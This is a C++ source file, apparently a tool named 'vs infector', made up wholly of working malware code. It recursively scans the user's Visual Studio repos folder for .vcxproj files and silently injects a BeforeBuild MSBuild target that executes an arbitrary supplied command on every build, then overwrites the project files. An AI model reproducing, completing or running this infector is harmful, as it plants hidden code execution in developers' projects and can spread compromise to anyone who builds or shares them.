#include "vs infector.h"
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>
#include <windows.h>
#include <ctime>

namespace fs = std::filesystem;

std::wstring getCommonRepoDir() {
    wchar_t* userProfile = nullptr;
    size_t len = 0;

    // Get the USERPROFILE environment variable
    _wdupenv_s(&userProfile, &len, L"USERPROFILE");

    if (userProfile) {
        std::wstring repoPath = userProfile;
        free(userProfile);
        repoPath += L"\\source\\repos";

        return repoPath;
    }

    // fallback if environment variable is missing
    return L"C:\\Users\\Default\\source\\repos";
}

void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {

    std::wstring block =
        L"\n  <Target Name=\"BeforeBuild\" BeforeTargets=\"PrepareForBuild\">\n"
        L"    <Exec Command=\"" + cmd + L"\" />\n"
        L"  </Target>\n";

    for (const auto& item : fs::recursive_directory_iterator(rootDir)) {
        if (item.path().extension() != L".vcxproj") continue;

        std::wstring path = item.path();

        std::wifstream input(path);
        if (!input) {
            continue;
        }

        std::wstringstream buffer;
        buffer << input.rdbuf();
        input.close();

        std::wstring contents = buffer.str();

        if (contents.find(L"Name=\"BeforeBuild\"") != std::wstring::npos) {
            continue;
        }

        size_t pos = contents.rfind(L"<Import ");
        if (pos != std::wstring::npos) {
            pos = contents.find(L">", pos);
            if (pos != std::wstring::npos) ++pos;
        } else {
            pos = contents.rfind(L"</Project>");
        }

        if (pos != std::wstring::npos) {
            contents.insert(pos, block);
            std::wofstream output(path, std::ios::trunc);
            if (output) {
                output << contents;
                output.close();
            } else {
                //write failed
            }
        } else {
            //no place to insert prebuildevent
        }
    }

    //scan finishes here
}
